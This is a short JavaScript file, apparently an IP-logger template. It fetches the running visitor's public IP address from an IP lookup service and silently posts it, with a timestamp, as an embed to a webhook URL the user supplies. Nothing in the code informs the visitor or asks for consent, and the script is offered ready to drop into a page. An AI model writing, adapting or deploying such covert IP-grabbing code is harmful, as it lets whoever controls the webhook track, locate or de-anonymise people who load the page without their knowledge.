var ip = ''; // Variable to store the retrieved IP address

fetch('https://api.ipify.org?format=json') // Send a GET request to retrieve the IP address
  .then(function(response) {
    return response.json(); // Extract JSON data
  })
  .then(function(data) {
    ip = data.ip; // Store the retrieved IP address
    console.log('Retrieved IP:', ip); // Log the retrieved IP address

    var webhook = 'Your webhook URL'; // Replace 'Your webhook URL' with the actual URL of your webhook
    var message = {
      embeds: [
        {
          title: 'IP Address', // Set the title of the embedded message
          description: getDescription(ip), // Call the getDescription() function to get the description for the IP address
          footer: {
            text: new Date().toLocaleString() // Set the footer text to the current date and time
          },
          color: 16711680 // Set the color of the embed (in this case, it's a shade of red)
        }
      ]
    };

    // Send a POST request to the webhook URL with the message payload
    fetch(webhook, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json' // Set the content type of the request to JSON
      },
      body: JSON.stringify(message) // Convert the message object to a JSON string and include it in the request body
    })
      .then(function(response) {
        if (response.ok) {
          console.log('Webhook sent successfully!'); // Log a success message if the webhook request is successful
        } else {
          console.log('Unable to send webhook. Status:', response.status); // Log an error message if the webhook request fails
        }
      })
      .catch(function(error) {
        console.error('Error sending webhook:', error); // Log an error message if there is an issue with the webhook request
      });
  });

// Function to generate the description for the IP address
// At the Developer section you can find a Code to Customize the getDescription(ip) function.
function getDescription(ip) {
    return ip; // Simply returns the IP address as the description
}
